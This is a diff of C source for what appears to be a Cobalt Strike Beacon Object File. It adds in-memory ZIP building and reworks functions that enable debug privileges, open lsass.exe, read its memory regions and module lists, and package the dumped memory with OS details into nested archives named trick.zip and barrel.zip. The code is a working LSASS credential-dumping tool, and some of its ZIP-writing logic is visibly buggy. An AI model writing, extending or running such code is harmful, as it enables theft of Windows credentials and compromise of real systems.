@@ -68,12 +68,13 @@ typedef struct _OBJECT_ATTRIBUTES {
 // New ZipFile structure
 typedef struct {
     char* filename;
-    char* content;
-    size_t size;
+    unsigned char* content;
+    int size;
 } ZipFile;
 
 #pragma pack(push, 1)  // Disable padding
 
+// Local File Header (without the filename)
 struct LocalFileHeader {
     int signature;           // 0x04034b50
     short version;             // Version needed to extract
@@ -88,6 +89,8 @@ struct LocalFileHeader {
     short extraFieldLength;    // Extra field length
 };
 
+
+// Central Directory Header (without the filename)
 struct CentralDirectoryHeader {
     int signature;           // 0x02014b50
     short versionMadeBy;       // Version made by
@@ -108,6 +111,7 @@ struct CentralDirectoryHeader {
     int relativeOffset;      // Offset of local header
 };
 
+// End of Central Directory Record
 struct EndOfCentralDirectory {
     int signature;           // 0x06054b50
     short diskNumber;          // Number of this disk
@@ -120,6 +124,7 @@ struct EndOfCentralDirectory {
 };
 
 #pragma pack(pop)  // Enable padding
+
 
 // Functions
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlGetVersion(POSVERSIONINFOW);
@@ -148,6 +153,7 @@ DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
+DECLSPEC_IMPORT VOID   WINAPI KERNEL32$RtlCopyMemory(PVOID Destination, CONST VOID *Source, SIZE_T Length);
 
 void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a) {
     p->Length = sizeof(OBJECT_ATTRIBUTES);
@@ -168,6 +174,435 @@ UNICODE_STRING InitUnicodeString(LPCWSTR str) {
 }
 
 
+//////////////////////////////////////////////////////////////////////////////////////////////////// ZIP File ///////////////////////////////////////////////////////////////////////////////////////////////////
+short getDosTime() {
+    return (12 << 11) | (0 << 5) | (0 / 2);  // Example: 12:00:00 (noon)
+}
+
+
+short getDosDate() {
+    return (2024 - 1980) << 9 | (9 << 5) | 28;  // Example: September 28, 2024
+}
+
+
+// CRC32 calculation (fixed)
+int crc32(const char* data, size_t length) {
+    unsigned int crc = 0xFFFFFFFF;  // Use unsigned for correct CRC-32 behavior
+
+    for (size_t i = 0; i < length; i++) {
+        crc ^= (unsigned char)data[i];  // Cast each byte to unsigned to avoid sign issues
+        for (int j = 0; j < 8; j++) {
+            if (crc & 1) {
+                crc = (crc >> 1) ^ 0xEDB88320;  // Apply polynomial
+            } else {
+                crc >>= 1;
+            }
+        }
+    }
+
+    // Final bitwise inversion, but return as signed int
+    int result = ~crc;
+    return result;
+}
+
+
+// Function to create a ZIP file
+void create_zip(const char* zip_fname, ZipFile* zip_files, int file_count) {
+    HANDLE hZipFile;
+    DWORD writtenBytes = 0;
+
+    // Open or create the ZIP file using CreateFile
+    hZipFile = KERNEL32$CreateFileA(zip_fname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hZipFile == INVALID_HANDLE_VALUE) {
+        return;
+    }
+
+    int centralDirSize = 0;
+    int centralDirOffset = 0;
+    long centralDirStart = 0;
+
+    // Allocate memory for the central directory headers
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    struct CentralDirectoryHeader* centralHeaders = (struct CentralDirectoryHeader*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, file_count * sizeof(struct CentralDirectoryHeader));
+    if (centralHeaders == NULL) {
+        KERNEL32$CloseHandle(hZipFile);
+        return;
+    }
+
+    // Process each file in the zip_files array
+    for (int i = 0; i < file_count; i++) {
+        const char* filename = zip_files[i].filename;
+        const char* fileContent = zip_files[i].content;
+        size_t fileSize = zip_files[i].size;
+
+        // Initialize the local file header
+        struct LocalFileHeader localHeader;
+        localHeader.signature = 0x04034b50;
+        localHeader.version = 20;  // Version needed to extract (2.0)
+        localHeader.flag = 0;
+        localHeader.compression = 0;  // No compression
+        localHeader.modTime = getDosTime();  // Define getDosTime() and getDosDate() to return time values
+        localHeader.modDate = getDosDate();
+        localHeader.crc32 = crc32(fileContent, fileSize);  // Define crc32() function to calculate CRC
+        localHeader.compressedSize = fileSize;
+        localHeader.uncompressedSize = fileSize;
+        localHeader.filenameLength = MyStrLen(filename);
+        localHeader.extraFieldLength = 0;
+
+        // Capture the local file header offset
+        DWORD localFileOffset = KERNEL32$SetFilePointer(hZipFile, 0, NULL, FILE_CURRENT);
+
+        // Write local file header
+        KERNEL32$WriteFile(hZipFile, &localHeader, sizeof(localHeader), &writtenBytes, NULL);
+        KERNEL32$WriteFile(hZipFile, filename, MyStrLen(filename), &writtenBytes, NULL);
+        KERNEL32$WriteFile(hZipFile, fileContent, fileSize, &writtenBytes, NULL);
+
+        // Prepare the central directory header for this file
+        struct CentralDirectoryHeader centralHeader;
+        centralHeader.signature = 0x02014b50;
+        centralHeader.versionMadeBy = 20;
+        centralHeader.versionNeeded = 20;
+        centralHeader.flag = 0;
+        centralHeader.compression = 0;
+        centralHeader.modTime = localHeader.modTime;
+        centralHeader.modDate = localHeader.modDate;
+        centralHeader.crc32 = localHeader.crc32;
+        centralHeader.compressedSize = localHeader.compressedSize;
+        centralHeader.uncompressedSize = localHeader.uncompressedSize;
+        centralHeader.filenameLength = localHeader.filenameLength;
+        centralHeader.extraFieldLength = 0;
+        centralHeader.commentLength = 0;
+        centralHeader.diskNumberStart = 0;
+        centralHeader.internalFileAttr = 0;
+        centralHeader.externalFileAttr = 0;
+        centralHeader.relativeOffset = localFileOffset;
+
+        // Store the central directory header
+        centralHeaders[i] = centralHeader;
+        centralDirSize += sizeof(centralHeader) + MyStrLen(filename);
+    }
+
+    // Capture the central directory start offset
+    centralDirStart = KERNEL32$SetFilePointer(hZipFile, 0, NULL, FILE_CURRENT);
+
+    // Write the central directory headers for all files
+    for (int i = 0; i < file_count; i++) {
+        KERNEL32$WriteFile(hZipFile, &centralHeaders[i], sizeof(centralHeaders[i]), &writtenBytes, NULL);
+        KERNEL32$WriteFile(hZipFile, zip_files[i].filename, zip_files[i].size, &writtenBytes, NULL);
+    }
+
+    // Initialize the end of central directory record
+    struct EndOfCentralDirectory eocd;
+    eocd.signature = 0x06054b50;
+    eocd.diskNumber = 0;
+    eocd.centralDirDisk = 0;
+    eocd.numEntriesOnDisk = file_count;
+    eocd.totalEntries = file_count;
+    eocd.centralDirSize = centralDirSize;
+    eocd.centralDirOffset = centralDirStart;
+    eocd.commentLength = 0;
+
+    // Write end of central directory record
+    KERNEL32$WriteFile(hZipFile, &eocd, sizeof(eocd), &writtenBytes, NULL);
+
+    // Clean up
+    KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+    KERNEL32$CloseHandle(hZipFile);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] ZIP file %s generated.\n", zip_fname);
+}
+
+ZipFile createZipFile(const char* fname, unsigned char* fcontent, int size) {
+    ZipFile zip_file;
+
+    // Get length of filename using MyStrLen
+    int fname_len = MyStrLen((char*)fname);
+
+    // Allocate memory for the filename and content using heap
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    zip_file.filename = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, fname_len + 1);  // Allocate memory for filename
+    zip_file.content = (unsigned char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);  // Allocate memory for binary content
+
+    // Use MyStrcpy to copy the filename (as it's a string)
+    MyStrcpy(zip_file.filename, fname, fname_len + 1);  // Ensure max_len includes null terminator
+
+    // Copy binary content (unsigned char) manually, as we can't rely on null terminators
+    for (int i = 0; i < size; i++) {
+        zip_file.content[i] = fcontent[i];
+    }
+    zip_file.size = size;  // Set the size of the content
+    return zip_file;
+}
+
+
+// Custom function to write data into the memory buffer
+int memory_write(char* buffer, size_t* offset, size_t buffer_size, const void* data, size_t data_size) {
+    if (*offset + data_size > buffer_size) {
+        // Handle buffer overflow (you may resize or report an error here)
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] memory_write failed\n");
+        return 0; // Return failure
+    }
+    KERNEL32$RtlCopyMemory(buffer + *offset, data, data_size);  // Copy data into the buffer
+    *offset += data_size;
+    return 1; // Return success
+}
+
+
+/*
+int create_zip_to_memory(char* buffer, size_t* offset, size_t buffer_size, ZipFile* zip_files, int file_count) {
+    struct CentralDirectoryHeader* centralHeaders = NULL;
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    
+    // Allocate memory for central directory headers
+    centralHeaders = (struct CentralDirectoryHeader*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(struct CentralDirectoryHeader) * file_count);
+    if (centralHeaders == NULL) {
+        return 0;  // Allocation failure
+    }
+
+    size_t centralDirSize = 0;
+    size_t centralDirStart = *offset;
+
+    // Process each file in the zip_files array
+    for (int i = 0; i < file_count; i++) {
+        const char* filename = zip_files[i].filename;
+        const char* fileContent = zip_files[i].content;
+        size_t fileSize = zip_files[i].size;
+
+        // Initialize the local file header
+        struct LocalFileHeader localHeader;
+        localHeader.signature = 0x04034b50;
+        localHeader.version = 20;  // Version needed to extract (2.0)
+        localHeader.flag = 0;
+        localHeader.compression = 0;  // No compression
+        localHeader.modTime = getDosTime();
+        localHeader.modDate = getDosDate();
+        localHeader.crc32 = crc32(fileContent, fileSize);
+        localHeader.compressedSize = fileSize;
+        localHeader.uncompressedSize = fileSize;
+        localHeader.filenameLength = MyStrLen(filename);
+        localHeader.extraFieldLength = 0;
+
+        // Write local file header to memory
+        if (!memory_write(buffer, offset, buffer_size, &localHeader, sizeof(localHeader))) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+
+        // Write filename to memory
+        if (!memory_write(buffer, offset, buffer_size, filename, MyStrLen(filename))) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+
+        // Write file content to memory
+        if (!memory_write(buffer, offset, buffer_size, fileContent, fileSize)) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+
+        // Prepare the central directory header for this file
+        struct CentralDirectoryHeader centralHeader;
+        centralHeader.signature = 0x02014b50;
+        centralHeader.versionMadeBy = 20;
+        centralHeader.versionNeeded = 20;
+        centralHeader.flag = 0;
+        centralHeader.compression = 0;
+        centralHeader.modTime = localHeader.modTime;
+        centralHeader.modDate = localHeader.modDate;
+        centralHeader.crc32 = localHeader.crc32;
+        centralHeader.compressedSize = localHeader.compressedSize;
+        centralHeader.uncompressedSize = localHeader.uncompressedSize;
+        centralHeader.filenameLength = localHeader.filenameLength;
+        centralHeader.extraFieldLength = 0;
+        centralHeader.commentLength = 0;
+        centralHeader.diskNumberStart = 0;
+        centralHeader.internalFileAttr = 0;
+        centralHeader.externalFileAttr = 0;
+        centralHeader.relativeOffset = centralDirStart;
+
+        // Store the central directory header
+        centralHeaders[i] = centralHeader;
+        centralDirSize += sizeof(centralHeader) + MyStrLen(filename);
+    }
+
+    // Capture the central directory start offset
+    centralDirStart = *offset;
+
+    // Write the central directory headers for all files to memory
+    for (int i = 0; i < file_count; i++) {
+        if (!memory_write(buffer, offset, buffer_size, &centralHeaders[i], sizeof(centralHeaders[i]))) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+        if (!memory_write(buffer, offset, buffer_size, zip_files[i].filename, MyStrLen(zip_files[i].filename))) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+    }
+
+    // Write the End of Central Directory record
+    struct EndOfCentralDirectory eocd;
+    eocd.signature = 0x06054b50;
+    eocd.diskNumber = 0;
+    eocd.centralDirDisk = 0;
+    eocd.numEntriesOnDisk = file_count;
+    eocd.totalEntries = file_count;
+    eocd.centralDirSize = centralDirSize;
+    eocd.centralDirOffset = centralDirStart;
+    eocd.commentLength = 0;
+
+    if (!memory_write(buffer, offset, buffer_size, &eocd, sizeof(eocd))) {
+        KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+        return 0;  // Failure
+    }
+
+    // Clean up
+    KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+
+    return 1;  // Success
+}
+*/
+
+
+int create_zip_to_memory(char* buffer, size_t* offset, size_t buffer_size, ZipFile* zip_files, int file_count) {
+    struct CentralDirectoryHeader* centralHeaders = NULL;
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+
+    // Allocate memory for central directory headers
+    centralHeaders = (struct CentralDirectoryHeader*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(struct CentralDirectoryHeader) * file_count);
+    if (centralHeaders == NULL) {
+        return 0;  // Allocation failure
+    }
+
+    size_t centralDirSize = 0;
+    size_t centralDirStart = *offset;  // Capture the start of the central directory
+
+    // Process each file in the zip_files array
+    for (int i = 0; i < file_count; i++) {
+        const char* filename = zip_files[i].filename;
+        const char* fileContent = (char*)zip_files[i].content;
+        size_t fileSize = zip_files[i].size;
+
+        // Initialize the local file header
+        struct LocalFileHeader localHeader;
+        localHeader.signature = 0x04034b50;
+        localHeader.version = 20;  // Version needed to extract (2.0)
+        localHeader.flag = 0;
+        localHeader.compression = 0;  // No compression
+        localHeader.modTime = getDosTime();
+        localHeader.modDate = getDosDate();
+        localHeader.crc32 = crc32(fileContent, fileSize);
+        localHeader.compressedSize = fileSize;
+        localHeader.uncompressedSize = fileSize;
+        localHeader.filenameLength = MyStrLen(filename);
+        localHeader.extraFieldLength = 0;
+
+        // Write local file header to memory
+        if (!memory_write(buffer, offset, buffer_size, &localHeader, sizeof(localHeader))) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+
+        // Write filename to memory
+        if (!memory_write(buffer, offset, buffer_size, filename, localHeader.filenameLength)) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+
+        // Write file content to memory
+        if (!memory_write(buffer, offset, buffer_size, fileContent, fileSize)) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+
+        // Prepare the central directory header for this file
+        struct CentralDirectoryHeader centralHeader;
+        centralHeader.signature = 0x02014b50;
+        centralHeader.versionMadeBy = 20;
+        centralHeader.versionNeeded = 20;
+        centralHeader.flag = 0;
+        centralHeader.compression = 0;
+        centralHeader.modTime = localHeader.modTime;
+        centralHeader.modDate = localHeader.modDate;
+        centralHeader.crc32 = localHeader.crc32;
+        centralHeader.compressedSize = localHeader.compressedSize;
+        centralHeader.uncompressedSize = localHeader.uncompressedSize;
+        centralHeader.filenameLength = localHeader.filenameLength;
+        centralHeader.extraFieldLength = 0;
+        centralHeader.commentLength = 0;
+        centralHeader.diskNumberStart = 0;
+        centralHeader.internalFileAttr = 0;
+        centralHeader.externalFileAttr = 0;
+        centralHeader.relativeOffset = centralDirStart;
+
+        // Store the central directory header
+        centralHeaders[i] = centralHeader;
+        centralDirSize += sizeof(centralHeader) + localHeader.filenameLength;
+        centralDirStart = *offset;  // Update the offset for the next file
+    }
+
+    // Write the central directory headers for all files to memory
+    for (int i = 0; i < file_count; i++) {
+        if (!memory_write(buffer, offset, buffer_size, &centralHeaders[i], sizeof(centralHeaders[i]))) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+
+        // Write filename associated with the central directory header
+        if (!memory_write(buffer, offset, buffer_size, zip_files[i].filename, centralHeaders[i].filenameLength)) {
+            KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+            return 0;  // Failure
+        }
+    }
+
+    // Write the End of Central Directory record
+    struct EndOfCentralDirectory eocd;
+    eocd.signature = 0x06054b50;
+    eocd.diskNumber = 0;
+    eocd.centralDirDisk = 0;
+    eocd.numEntriesOnDisk = file_count;
+    eocd.totalEntries = file_count;
+    eocd.centralDirSize = centralDirSize;
+    eocd.centralDirOffset = centralDirStart;
+    eocd.commentLength = 0;
+
+    if (!memory_write(buffer, offset, buffer_size, &eocd, sizeof(eocd))) {
+        KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+        return 0;  // Failure
+    }
+
+    // Clean up
+    KERNEL32$HeapFree(hHeap, 0, centralHeaders);
+
+    return 1;  // Success
+}
+
+
+char* create_inner_zip_in_memory(ZipFile* inner_files, int inner_file_count, size_t* zip_size) {
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    
+    // Allocate a buffer for ZIP data (initial size is arbitrary, adjust as needed)
+    size_t buffer_size = 1024 * 1024 * 1024; // 1024MB initial size - ?????
+    char* zip_buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, buffer_size);
+    if (zip_buffer == NULL) {
+        return NULL;
+    }
+
+    // Track the current write position in the buffer
+    size_t write_offset = 0;
+
+    // Modify the create_zip function to use memory_write
+    if (!create_zip_to_memory(zip_buffer, &write_offset, buffer_size, inner_files, inner_file_count)) {
+        // Error handling if memory write fails
+        KERNEL32$HeapFree(hHeap, 0, zip_buffer);
+        return NULL;
+    }
+
+    // Set the total size of the ZIP data written
+    *zip_size = write_offset;
+
+    return zip_buffer;
+}
+//////////////////////////////////////////////////////////////////////////////////////////////////// ZIP File ///////////////////////////////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////
 void MyMemcpy(char* dest, const char* src, int size) {
     for (int i = 0; i < size; i++) {
@@ -916,185 +1351,13 @@ char* get_json_barrel(MemFile* memfile_list, int memfile_count){
 }
 
 
-void free_concatenated_string(char* str) {
-    if (str != NULL) {
-        HANDLE hHeap = KERNEL32$GetProcessHeap();
-        if (hHeap != NULL) {
-            KERNEL32$HeapFree(hHeap, 0, str);
-        }
-    }
-}
 
-
-short getDosTime() {
-    return (12 << 11) | (0 << 5) | (0 / 2);  // Example: 12:00:00 (noon)
-}
-
-
-short getDosDate() {
-    return (2024 - 1980) << 9 | (9 << 5) | 28;  // Example: September 28, 2024
-}
-
-
-int crc32(const char* data, size_t length) {
-    unsigned int crc = 0xFFFFFFFF;
-    for (size_t i = 0; i < length; i++) {
-        crc ^= (unsigned char)data[i];
-        for (int j = 0; j < 8; j++) {
-            if (crc & 1) {
-                crc = (crc >> 1) ^ 0xEDB88320;
-            } else {
-                crc >>= 1;
-            }
-        }
-    }
-    int result = ~crc;
-    return result;
-}
-
-
-// Function to create a ZIP file
-void create_zip(const char* zip_fname, ZipFile* zip_files, int file_count) {
-    HANDLE hZipFile;
-    DWORD writtenBytes = 0;
-
-    // Open or create the ZIP file using CreateFile
-    hZipFile = KERNEL32$CreateFileA(zip_fname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hZipFile == INVALID_HANDLE_VALUE) {
-        // printf("Failed to open zip file.\n");
-        return;
-    }
-
-    int centralDirSize = 0;
-    int centralDirOffset = 0;
-    long centralDirStart = 0;
-
-    // Allocate memory for the central directory headers
-    HANDLE hHeap = KERNEL32$GetProcessHeap();
-    struct CentralDirectoryHeader* centralHeaders = (struct CentralDirectoryHeader*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, file_count * sizeof(struct CentralDirectoryHeader));
-    if (centralHeaders == NULL) {
-        KERNEL32$CloseHandle(hZipFile);
-        return;
-    }
-
-    // Process each file in the zip_files array
-    for (int i = 0; i < file_count; i++) {
-        const char* filename = zip_files[i].filename;
-        const char* fileContent = zip_files[i].content;
-        size_t fileSize = zip_files[i].size;
-
-        // Initialize the local file header
-        struct LocalFileHeader localHeader;
-        localHeader.signature = 0x04034b50;
-        localHeader.version = 20;  // Version needed to extract (2.0)
-        localHeader.flag = 0;
-        localHeader.compression = 0;  // No compression
-        localHeader.modTime = getDosTime();  // Define getDosTime() and getDosDate() to return time values
-        localHeader.modDate = getDosDate();
-        localHeader.crc32 = crc32(fileContent, fileSize);  // Define crc32() function to calculate CRC
-        localHeader.compressedSize = fileSize;
-        localHeader.uncompressedSize = fileSize;
-        localHeader.filenameLength = MyStrLen(filename);
-        localHeader.extraFieldLength = 0;
-
-        // Capture the local file header offset
-        DWORD localFileOffset = KERNEL32$SetFilePointer(hZipFile, 0, NULL, FILE_CURRENT);
-
-        // Write local file header
-        KERNEL32$WriteFile(hZipFile, &localHeader, sizeof(localHeader), &writtenBytes, NULL);
-        KERNEL32$WriteFile(hZipFile, filename, MyStrLen(filename), &writtenBytes, NULL);
-        KERNEL32$WriteFile(hZipFile, fileContent, fileSize, &writtenBytes, NULL);
-
-        // Prepare the central directory header for this file
-        struct CentralDirectoryHeader centralHeader;
-        centralHeader.signature = 0x02014b50;
-        centralHeader.versionMadeBy = 20;
-        centralHeader.versionNeeded = 20;
-        centralHeader.flag = 0;
-        centralHeader.compression = 0;
-        centralHeader.modTime = localHeader.modTime;
-        centralHeader.modDate = localHeader.modDate;
-        centralHeader.crc32 = localHeader.crc32;
-        centralHeader.compressedSize = localHeader.compressedSize;
-        centralHeader.uncompressedSize = localHeader.uncompressedSize;
-        centralHeader.filenameLength = localHeader.filenameLength;
-        centralHeader.extraFieldLength = 0;
-        centralHeader.commentLength = 0;
-        centralHeader.diskNumberStart = 0;
-        centralHeader.internalFileAttr = 0;
-        centralHeader.externalFileAttr = 0;
-        centralHeader.relativeOffset = localFileOffset;
-
-        // Store the central directory header
-        centralHeaders[i] = centralHeader;
-        centralDirSize += sizeof(centralHeader) + MyStrLen(filename);
-    }
-
-    // Capture the central directory start offset
-    centralDirStart = KERNEL32$SetFilePointer(hZipFile, 0, NULL, FILE_CURRENT);
-
-    // Write the central directory headers for all files
-    for (int i = 0; i < file_count; i++) {
-        KERNEL32$WriteFile(hZipFile, &centralHeaders[i], sizeof(centralHeaders[i]), &writtenBytes, NULL);
-        KERNEL32$WriteFile(hZipFile, zip_files[i].filename, MyStrLen(zip_files[i].filename), &writtenBytes, NULL);
-    }
-
-    // Initialize the end of central directory record
-    struct EndOfCentralDirectory eocd;
-    eocd.signature = 0x06054b50;
-    eocd.diskNumber = 0;
-    eocd.centralDirDisk = 0;
-    eocd.numEntriesOnDisk = file_count;
-    eocd.totalEntries = file_count;
-    eocd.centralDirSize = centralDirSize;
-    eocd.centralDirOffset = centralDirStart;
-    eocd.commentLength = 0;
-
-    // Write end of central directory record
-    KERNEL32$WriteFile(hZipFile, &eocd, sizeof(eocd), &writtenBytes, NULL);
-
-    // Clean up
-    KERNEL32$HeapFree(hHeap, 0, centralHeaders);
-    KERNEL32$CloseHandle(hZipFile);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated.\n", zip_fname);
-}
-
-
-ZipFile createZipFile(const char* fname, unsigned char* fcontent, int size) {
-    ZipFile zip_file;
-    int fname_len = MyStrLen((char*)fname);
-    HANDLE hHeap = KERNEL32$GetProcessHeap();
-    zip_file.filename = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, fname_len + 1);  // +1 for null terminator
-    zip_file.content = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);  // Allocate exact size for content
-    MyStrcpy(zip_file.filename, fname, fname_len + 1);  // Ensure max_len includes null terminator
-    MyMemcpy(zip_file.content, fcontent, size);  // No need for MyStrcpy, as we're copying raw bytes
-    zip_file.size = (size_t) size;
-    return zip_file;
-}
-
-
-void dump_files(MemFile* memfile_list, int memfile_count, char* zip_name){
-    HANDLE hHeap = KERNEL32$GetProcessHeap();
-    ZipFile* zip_files = (ZipFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ZipFile) * memfile_count);
-    if (!zip_files) {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for zip_files.");
-        return;
-    }
-    for (int i = 0; i < memfile_count; i++) {
-        zip_files[i] = createZipFile(memfile_list[i].filename, memfile_list[i].content, memfile_list[i].size);
-    }
-
-    // Create a ZIP file with one element
-    create_zip(zip_name, zip_files, memfile_count);
-}
-
-
-void Barrel(char* filename, HANDLE hProcess, char* zip_name){
+MemFile* Barrel(char* filename, HANDLE hProcess, char* zip_name, ZipFile* barrelZipFileOutput, int* memfile_countOutput){
     long long proc_max_address_l = 0x7FFFFFFEFFFF;
     PVOID mem_address = 0;
     int aux_size = 0;
     char aux_name[MAX_PATH] = "";
-     int memfile_count = 0;
+    int memfile_count = 0;
     HANDLE hHeap = KERNEL32$GetProcessHeap();  
     MemFile* memfile_list = (MemFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(MemFile) * MAX_MODULES);
 
@@ -1126,11 +1389,12 @@ void Barrel(char* filename, HANDLE hProcess, char* zip_name){
     
     // Create JSON
     char* json_output = get_json_barrel(memfile_list, memfile_count);
-    int data_len = MyStrLen(json_output);
-    write_string_to_file(filename, json_output, data_len, TRUE);
-
-    // Create dump files
-    dump_files(memfile_list, memfile_count, zip_name);
+    int json_output_len = MyStrLen(json_output);
+    //write_string_to_file(filename, json_output, json_output_len, TRUE);
+    ZipFile barrelZipFile = createZipFile("barrel.json", json_output, json_output_len);
+    *barrelZipFileOutput = barrelZipFile;
+    *memfile_countOutput = memfile_count;
+    return memfile_list;
 }
 
 
@@ -1169,7 +1433,7 @@ char* get_json_shock(ModuleInformation* module_list, int module_counter){
 }
 
     
-void Shock(char* filename, HANDLE* hProcessOutput){
+ZipFile Shock(char* filename, HANDLE* hProcessOutput){
     EnableDebugPrivileges();
     HANDLE hProcess = GetProcessByName("c:\\windows\\system32\\lsass.exe");
     *hProcessOutput = hProcess;
@@ -1217,11 +1481,13 @@ void Shock(char* filename, HANDLE* hProcessOutput){
 
     char* json_output = get_json_shock(module_list, module_counter);
     int json_output_len = MyStrLen(json_output);
-    write_string_to_file(filename, json_output, json_output_len, TRUE);
+    // write_string_to_file(filename, json_output, json_output_len, TRUE);
+    ZipFile shockZipFile = createZipFile("shock.json", json_output, json_output_len);
+    return shockZipFile;
 }
 
 
-void Lock(char* filename){
+ZipFile Lock(char* filename){
     OSVERSIONINFOW osvi;
     NTSTATUS status = NTDLL$RtlGetVersion(&osvi);
     if (status == 0) {
@@ -1237,7 +1503,8 @@ void Lock(char* filename){
         char* json_entry = concatenate_strings(concatenate_strings(json_part_1, json_part_2), json_part_3);
         char* json_output = concatenate_strings(concatenate_strings("[", json_entry), "]");
         int json_output_len = MyStrLen(json_output);
-        write_string_to_file(filename, json_output, json_output_len, TRUE);
+        ZipFile lockZipFile = createZipFile("lock.json", json_output, json_output_len);
+        return lockZipFile;
     }
 }
 
@@ -1259,16 +1526,30 @@ void go(char *args, int length) {
     char* filename_lock   = "lock.json";
     char* filename_shock  = "shock.json";
     char* filename_barrel = "barrel.json";
-    char* zip_name = "barrel.zip";    
+    char* zip_name =        "trick.zip";    
+    char* nested_zip_name = "barrel.zip";
+
     HANDLE hProcess;
+    ZipFile lockZipFile   = Lock(filename_lock);
+    ZipFile shockZipFile  = Shock(filename_shock, &hProcess);
+    ZipFile barrelZipFile;
+    int memfile_count;
+    MemFile* memfile_list =  Barrel(filename_barrel, hProcess, zip_name, &barrelZipFile, &memfile_count);
 
-    // Create folder with random name (or you can set a fixed folder name)
-    // char* barrel_folder_name[10];
-    // generate_random_string(barrel_folder_name, 10);
-    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Created folder: \t\t%s\n", barrel_folder_name);
-    // KERNEL32$CreateDirectoryA(barrel_folder_name, NULL);
+    int inner_files_number = memfile_count;
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    ZipFile* inner_files = (ZipFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ZipFile) * inner_files_number);
+    for(int i=0; i < inner_files_number; i++){
+        inner_files[i] = createZipFile(memfile_list[i].filename, (unsigned char*)memfile_list[i].content, memfile_list[i].size);
+    }   
+    int outer_files_number = 4;
+    size_t inner_zip_size;
+    unsigned char* inner_zip_bytes = create_inner_zip_in_memory(inner_files, inner_files_number, &inner_zip_size);
 
-    Lock(filename_lock);
-    Shock(filename_shock, &hProcess);
-    Barrel(filename_barrel, hProcess, zip_name);
+    ZipFile* outer_files = (ZipFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ZipFile) * outer_files_number);    
+    outer_files[0] = lockZipFile;
+    outer_files[1] = shockZipFile;
+    outer_files[2] = barrelZipFile;
+    outer_files[3] = createZipFile(nested_zip_name, inner_zip_bytes, inner_zip_size);
+    create_zip(zip_name, outer_files, outer_files_number);
 }
